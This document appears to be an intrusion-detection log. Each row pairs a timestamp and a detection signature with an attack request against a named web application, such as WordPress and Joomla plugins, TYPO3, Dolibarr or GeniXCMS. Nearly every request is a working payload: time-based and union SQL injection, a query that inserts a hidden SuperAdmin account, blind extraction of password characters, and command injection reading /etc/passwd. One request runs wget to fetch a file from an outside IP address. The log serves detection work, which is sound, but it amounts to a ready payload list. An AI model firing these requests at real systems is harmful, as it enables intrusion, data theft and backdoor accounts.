2021-09-04T11:19	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)	s2b-1330-5
2021-09-04T11:19	/fiyo/apps/app_article/controller/editor.php?id=" and sleep(10)&art_title=123	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=form%20form=1%20field=1%0Aunion%0Aselect%0Auser()%23	s2b-1365-5
2021-09-04T11:19	/index.php?c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=related catid=1 tag=1,2 num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,version())),1)	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=related catid=1 tag=1,2 num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,version())),1)	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=tags catid=1 tag=1,2 num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,version())),1)	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=tags catid=1 tag=1,2 num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),concat(0x3a,version())),1)	script-HTTP::URI_SQLI
2021-09-04T11:19	/piwigo/admin.php?page=cat_options&section=status&cat_false[]=755&trueify=%c2%ab	s2b-1301-11
2021-09-04T11:19	/piwigo/admin.php?page=cat_options&section=comments?cat_true[]=7*55&falsify=%c2%bb	s2b-1301-11
2021-09-04T11:19	/piwigo/admin.php?page=cat_options&section=comments&cat_true[]=7*55&falsify=%c2%bb	s2b-1301-11
2021-09-04T11:19	/websitebaker/account/preferences.php?action=details&display_name=24444' union select sleep(6)#	script-HTTP::URI_SQLI
2021-09-04T11:19	/websitebaker/account/preferences.php?action=details&display_name=24444' union select sleep(6)#	script-HTTP::URI_SQLI
2021-09-04T11:19	/theme/eldy/style.css.php?lang=de';INSERT INTO llx_user VALUES (424242, 0, NULL, NULL, 1, 0, '1984-01-01 00:00:00', '1984-01-01 00:00:00.000', NULL, NULL, 'newadmin', NULL, '61529519452809720693702583126814', NULL, NULL, '', NULL, 'SuperAdmin', '', '', '', '', NULL, NULL, '', '', '', '', '', '', '', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, '', '2017-03-10 00:00:00', '2017-03-10 00:00:00', NULL, '', NULL, 1, NULL, NULL, '', NULL, 0, '', 0, NULL, NULL, NULL, NULL, NULL);--'	script-HTTP::URI_SQLI
2021-09-04T11:19	/theme/eldy/style.css.php?lang=de';INSERT INTO llx_user VALUES (424242, 0, NULL, NULL, 1, 0, '1984-01-01 00:00:00', '1984-01-01 00:00:00.000', NULL, NULL, 'newadmin', NULL, '61529519452809720693702583126814', NULL, NULL, '', NULL, 'SuperAdmin', '', '', '', '', NULL, NULL, '', '', '', '', '', '', '', 1, 1, 1, NULL, NULL, NULL, NULL, NULL, '', '2017-03-10 00:00:00', '2017-03-10 00:00:00', NULL, '', NULL, 1, NULL, NULL, '', NULL, 0, '', 0, NULL, NULL, NULL, NULL, NULL);--'	script-HTTP::URI_SQLI
2021-09-04T11:19	/yeager/ui/js/3rd/plupload/examples/upload.php	s2b-2077-2
2021-09-04T11:19	/zm/index.php?view=request&request=log&task=query&limit=100;(SELECT *FROM (SELECT(SLEEP(5)))OQkj)	script-HTTP::URI_SQLI
2021-09-04T11:19	/zm/index.php?view=request&request=log&task=query&limit=100;(SELECT *FROM (SELECT(SLEEP(5)))OQkj)	script-HTTP::URI_SQLI
2021-09-04T11:19	/latest.php?output=ajax&sid=&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385); select * from users where (1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/latest.php?output=ajax&sid=&favobj=toggle&toggle_open_state=1&toggle_ids[]=15385); select * from users where (1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or(Select(case(36)when(ascii(substring(`customers_password`FROM(1)FOR(1))))then-sleep(5)End)from`customers`where`customers_id`=1)/*&customers_status=*/#	script-HTTP::URI_SQLI
2021-09-04T11:19	/shop/api/easybill/easybillcsv.php?token=MODULE_EASYBILL_CSV_CRON_TOKEN&orders_status=-111'))or(Select(case(36)when(ascii(substring(`customers_password`FROM(1)FOR(1))))then-sleep(5)End)from`customers`where`customers_id`=1)/*&customers_status=*/#	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?controller=blog&action=show&title=xx' union select1,user(),3,4,5,6,7,8,9,0,11,2,3,4,5,6,7,8,9,0#	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?controller=blog&action=show&title=xx' union select1,user(),3,4,5,6,7,8,9,0,11,2,3,4,5,6,7,8,9,0#	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?controller=expComment&action=showComments&content_id=11 union select 1,2,3,4,version(),6,7,8,9,10,11-- s&config[disable_nested_comments]=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?controller=expComment&action=showComments&content_id=11 union select 1,2,3,4,version(),6,7,8,9,10,11-- s&config[disable_nested_comments]=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/genixcms0.0.8/index.php?page=modules&act=activate&token=I34jF0V6R1quEIS3kFBDsZfqyIuB1u8ywKvnUPB5LKS6uSntgHk6KYIR6R4T5Y9pXXtZtSBeCz1XW0tm&modules=aa' and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(2),0)))a) or 'a'='a	script-HTTP::URI_SQLI
2021-09-04T11:19	/genixcms0.0.8/index.php?page=modules&act=activate&token=I34jF0V6R1quEIS3kFBDsZfqyIuB1u8ywKvnUPB5LKS6uSntgHk6KYIR6R4T5Y9pXXtZtSBeCz1XW0tm&modules=aa' and (select * from (select(if(ascii(substr((select user()),1,1))=114,sleep(2),0)))a) or 'a'='a	script-HTTP::URI_SQLI
2021-09-04T11:19	/GeniXCMS/register.php?activation=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#	script-HTTP::URI_SQLI
2021-09-04T11:19	/GeniXCMS/register.php?activation=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#	script-HTTP::URI_SQLI
2021-09-04T11:19	/GeniXCMS/?author=user1&type=hi' OR (SELECT 1431 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bPMf	script-HTTP::URI_SQLI
2021-09-04T11:19	/GeniXCMS/?author=user1&type=hi' OR (SELECT 1431 FROM(SELECT COUNT(*),CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,54)),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- bPMf	script-HTTP::URI_SQLI
2021-09-04T11:19	/api/content/save/1?address1=e&address2=e&city=e&contactMe=false&email=sample@email.tst&firstName=e&fund=Growth&ipAddress=127.0.0.1&lastName=e&state=e&stName=-1' OR 3_2_1=6 AND 00053=00053 or 'cFbN0pEu'='	script-HTTP::URI_SQLI
2021-09-04T11:19	/api/content/save/1?address1=e&address2=e&city=e&contactMe=false&email=sample@email.tst&firstName=e&fund=Growth&ipAddress=127.0.0.1&lastName=e&state=e&stName=-1' OR 3_2_1=6 AND 00053=00053 or 'cFbN0pEu'='	script-HTTP::URI_SQLI
2021-09-04T11:19	/categoriesServlet?start=0&count=10&sort=keywords LIMIT (SELECT CASE WHEN (1=1) THEN 1 ELSE -1 END)	script-HTTP::URI_SQLI
2021-09-04T11:19	/categoriesServlet?start=0&count=10&sort=keywords LIMIT (SELECT CASE WHEN (1=1) THEN 1 ELSE -1 END)	script-HTTP::URI_SQLI
2021-09-04T11:19	/categoriesServlet?start=0&count=10&sort=keywords LIMIT (SELECT CASE WHEN (1=0) THEN 1 ELSE -1 END)	script-HTTP::URI_SQLI
2021-09-04T11:19	/categoriesServlet?start=0&count=10&sort=keywords LIMIT (SELECT CASE WHEN (1=0) THEN 1 ELSE -1 END)	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1&apos;union%20select1,'./','evil.php',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../../../../../../../etc/passwd	s2b-1113-5
2021-09-04T11:19	/index.php?controller=pixidou&action=exitEditor&exitType=saveAsIs&fid=-1&apos;union%20select1,'./','1.txt',4,5,6,7,8,9,0,1,2,3,4,5%23&cpi=../../framework/conf/config.php	s2b-1113-5
2021-09-04T11:19	/ping.cgi?DIA_IPADDRESS=8.8.8.8;cat%20/etc/passwd	s2b-1147-7
2021-09-04T11:19	/es/index.php?option=com_virtuemart&view=categorysearch' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))sgjA) AND 'jHwz'='jHwz&task=smartSearch	script-HTTP::URI_SQLI
2021-09-04T11:19	/es/index.php?option=com_virtuemart&view=categorysearch' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))sgjA) AND 'jHwz'='jHwz&task=smartSearch	script-HTTP::URI_SQLI
2021-09-04T11:19	/typo3/index.php?id=8&no_cache=1?tx_news_pi1[overwriteDemand][order]=uid*(case((ord(substring((select(length(password)+9)from(be_users)where(uid=1))from(1)for(1))))=48)when(1)then(1)else(-1)end)&tx_news_pi1[overwriteDemand][OrderByAllowed]=uid*(case((ord(substring((select(length(password)+9)from(be_users)where(uid=1))from(1)for(1))))=48)when(1)then(1)else(-1)end)&tx_news_pi1[search][subject]=''&tx_news_pi1[search][minimumDate]=2016-01-01&tx_news_pi1[search][maximumDate]=2016-12-31	script-HTTP::URI_SQLI
2021-09-04T11:19	/typo3/index.php?id=8&no_cache=1?tx_news_pi1[overwriteDemand][order]=uid*(case((ord(substring((select(length(password)+9)from(be_users)where(uid=1))from(1)for(1))))=48)when(1)then(1)else(-1)end)&tx_news_pi1[overwriteDemand][OrderByAllowed]=uid*(case((ord(substring((select(length(password)+9)from(be_users)where(uid=1))from(1)for(1))))=48)when(1)then(1)else(-1)end)&tx_news_pi1[search][subject]=''&tx_news_pi1[search][minimumDate]=2016-01-01&tx_news_pi1[search][maximumDate]=2016-12-31	script-HTTP::URI_SQLI
2021-09-04T11:19	/sources/view.query.php?type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC	script-HTTP::URI_SQLI
2021-09-04T11:19	/sources/view.query.php?type=connections_logs&order=date AND (SELECT * FROM (SELECT(SLEEP(5)))vhPw)&direction=DESC	script-HTTP::URI_SQLI
2021-09-04T11:19	/yeager/y.php/tab_USERLIST?win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=1 and 1=1&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/yeager/y.php/tab_USERLIST?win_no=4&yg_id=2-user&yg_type=user&wid=wid_4&refresh=1&initload=&us=sess_16000&lh=325&pagedir_page=2&pagedir_perpage=1&pagedir_orderby=1 and 1=1&pagedir_orderdir=4&pagedir_from=5&pagedir_limit=6,7&newRole=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/cgi-bin/dna/sysAdmin.cgi?$'investigator=&username=&navUserName=&investigator=&username=&executeCmdData=uname%20-a&Action=executeCmd'	s2b-1331-5
2021-09-04T11:19	/wp-admin/admin-ajax.php?action=catalogue_update_order&list-item[1]=1 AND (SELECT * FROM (SELECT(SLEEP(5)))jXfE)	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin-ajax.php?action=catalogue_update_order&list-item[1]=1 AND (SELECT * FROM (SELECT(SLEEP(5)))jXfE)	script-HTTP::URI_SQLI
2021-09-04T11:19	/wf-NAME/social/api/feed/aggregation/201803310000?ticket=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 7 name FROM master..sysdatabases ORDER BY name) ORDER BY name),5,1))>104) WAITFOR DELAY '0:0:1'-- qvAV&after=1523013041889&lang=de&_dc=1523013101769	script-HTTP::URI_SQLI
2021-09-04T11:19	/wf-NAME/social/api/feed/aggregation/201803310000?ticket=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN (SELECT TOP 7 name FROM master..sysdatabases ORDER BY name) ORDER BY name),5,1))>104) WAITFOR DELAY '0:0:1'-- qvAV&after=1523013041889&lang=de&_dc=1523013101769	script-HTTP::URI_SQLI
2021-09-04T11:19	/ladder/stats.php?game=W2BN&type=1&user=cat%20/etc/passwd	s2b-1147-7
2021-09-04T11:19	/ladder/stats.php?game=cat%20/etc/passwd&type=cat%20/etc/passwd&sortBy=username&sort_direction=cat%20/etc/passwd	s2b-1147-7
2021-09-04T11:19	/get_sec.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/get_sec.php?q=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_socialpinboard&view=ajaxcontrol&tmpl=component&task=getlikeinfo&pin_id=1 and 1=1&user_id=1 and 1=1::/www/index.php?option=com_socialpinboard&view=gift&starts=100&ends=1 and 1=1::/www/index.php?option=com_socialpinboard&view=home&category=1 and 1=1::/www/index.php?option=com_socialpinboard&view=pindisplay&uid=1 and 1=1::/www/index.php?option=com_socialpinboard&view=search&serachVal=1 and 1=1::/www/index.php?option=com_socialpinboard&view=likes&uid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_socialpinboard&view=ajaxcontrol&tmpl=component&task=getlikeinfo&pin_id=1 and 1=1&user_id=1 and 1=1::/www/index.php?option=com_socialpinboard&view=gift&starts=100&ends=1 and 1=1::/www/index.php?option=com_socialpinboard&view=home&category=1 and 1=1::/www/index.php?option=com_socialpinboard&view=pindisplay&uid=1 and 1=1::/www/index.php?option=com_socialpinboard&view=search&serachVal=1 and 1=1::/www/index.php?option=com_socialpinboard&view=likes&uid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/?page_id=2&eventyear=2015 AND 1=1 )--&dateset=on&eventday=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/?page_id=2&eventyear=2015 AND 1=1 )--&dateset=on&eventday=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/view.php?id=-1' union select 1,version(),3,database(),5,6	script-HTTP::URI_SQLI
2021-09-04T11:19	/view.php?id=-1' union select 1,version(),3,database(),5,6	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=1 and 1=1&gid=1	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=1 and 1=1&gid=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=imgedit&imgid=1 and 1=1&gid=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=1 and 1=1	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=gallery_with_slideshow&val=view&gid=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=eventr/attendees.php&event=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=eventr/attendees.php&event=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=eventr/event_form.php&event=1 and 1=1&action=edit	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=eventr/event_form.php&event=1 and 1=1&action=edit	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=surveys/survey_form.php&survey=1 and 1=1&action=edit	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=surveys/survey_form.php&survey=1 and 1=1&action=edit	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=surveys/question.php&survey=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/edit.php?page=surveys/question.php&survey=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=1 and 1=1	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=easy_team_manager_edit&id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin.php?page=rk_user_lists&info=del&did=1 and 1=1	s2b-1301-11
2021-09-04T11:19	/wp-admin/admin.php?page=rk_user_lists&info=del&did=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin.php?page=rk_user_lists&info=del&did=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/options-general.php?page=wordpress-gallery-transformation/gallery.php&picnj=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media[]=5 %1$%s hello	s2b-2077-2
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=wpdevart_gallery_themes&task=add_edit_theme&id=-1+UNION+ALL+SELECT+NULL,@@VERSION,NULL,NULL--::/wordpress/wp-admin/admin.php?page=wpdevart_gallery_themes&task=add_edit_theme&id=1+and+1=0	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=events&action=delete_recurrence_series&recurrence_id=0+and+sleep(+if(ascii(substr(database(),1,1))<119,0,5))	s2b-1301-11
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=events&action=delete_recurrence_series&recurrence_id=0+and+sleep(+if(ascii(substr(database(),1,1))<119,0,5))	script-HTTP::URI_SQLI
2021-09-04T11:19	/wordpress/wp-admin/admin.php?page=events&action=delete_recurrence_series&recurrence_id=0+and+sleep(+if(ascii(substr(database(),1,1))<119,0,5))	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin-ajax.php?action=ctimeline_frontend_get&timeline=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/wp-admin/admin-ajax.php?action=ctimeline_frontend_get&timeline=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/topics/deletetopics.php?project=1'+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))+and+'2'='2::/topics/deletetopics.php?project=1&id=1+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))::/bookmarks/deletebookmarks.php?action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)::/calendar/deletecalendar.php?project=&action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)	script-HTTP::URI_SQLI
2021-09-04T11:19	/topics/deletetopics.php?project=1'+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))+and+'2'='2::/topics/deletetopics.php?project=1&id=1+and+(SELECT+SLEEP(5)+FROM+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116))::/bookmarks/deletebookmarks.php?action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)::/calendar/deletecalendar.php?project=&action=delete&id=select+sleep(5)+from+members+where+login+like+0x61646d696e+and+substr(password,1,1)+like+CHAR(116)	script-HTTP::URI_SQLI
2021-09-04T11:19	/esiclivre/restrito/inc/lkpcep.php?q=AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(HEX(IFNULL(CAST(schema_name AS CHAR),0x20))) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 13,1),11,1))>1,0,5)))))oslN)-- UACx	script-HTTP::URI_SQLI
2021-09-04T11:19	/esiclivre/restrito/inc/lkpcep.php?q=AND (SELECT * FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT DISTINCT(HEX(IFNULL(CAST(schema_name AS CHAR),0x20))) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 13,1),11,1))>1,0,5)))))oslN)-- UACx	script-HTTP::URI_SQLI
2021-09-04T11:19	/recept.php?id=-1 union select user()	script-HTTP::URI_SQLI
2021-09-04T11:19	/recept.php?id=-1 union select user()	script-HTTP::URI_SQLI
2021-09-04T11:19	/playlists.php?playlist=' UNION SELECT null,concat(0x223c2f613e3c2f64 69763e3c2f6469763e,version(),0 x3c212d2d),null,null,null,null ,null,null,null,null,null-- -	script-HTTP::URI_SQLI
2021-09-04T11:19	/playlists.php?playlist=' UNION SELECT null,concat(0x223c2f613e3c2f64 69763e3c2f6469763e,version(),0 x3c212d2d),null,null,null,null ,null,null,null,null,null-- -	script-HTTP::URI_SQLI
2021-09-04T11:19	/phpCollab-v2.5.1/newsdesk/newsdesk.php?action=show&id=1 and ascii(substr(md5(1),1,1))=99&PHPSESSID=aoanbk4f8dl89trecdir46dq82	script-HTTP::URI_SQLI
2021-09-04T11:19	/phpCollab-v2.5.1/newsdesk/newsdesk.php?action=show&id=1 and ascii(substr(md5(1),1,1))=99&PHPSESSID=aoanbk4f8dl89trecdir46dq82	script-HTTP::URI_SQLI
2021-09-04T11:19	/category.php?id=1 and 1=1::/www/author.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/category.php?id=1 and 1=1::/www/author.php?id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?cmd=agent&mod=true&ID=1 and 1=1::/www/index.php?cmd=client_master&mod=true&ID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?cmd=agent&mod=true&ID=1 and 1=1::/www/index.php?cmd=client_master&mod=true&ID=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-scategory.php?sc=1 and 1=1::/www/service-provider.php?ser=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/browse-scategory.php?sc=1 and 1=1::/www/service-provider.php?ser=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_ns_downloadshop&amp;task=invoice.create&amp;id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_ns_downloadshop&amp;task=invoice.create&amp;id=1 and 1=1	script-HTTP::URI_SQLI
2021-09-04T11:19	/index.php?option=com_zhyandexmap&amp;view=zhyandexmap&amp;tmpl=component&amp;id=3&amp;placemarklistid=1 and 1=1	script-HTTP::URI_SQLI
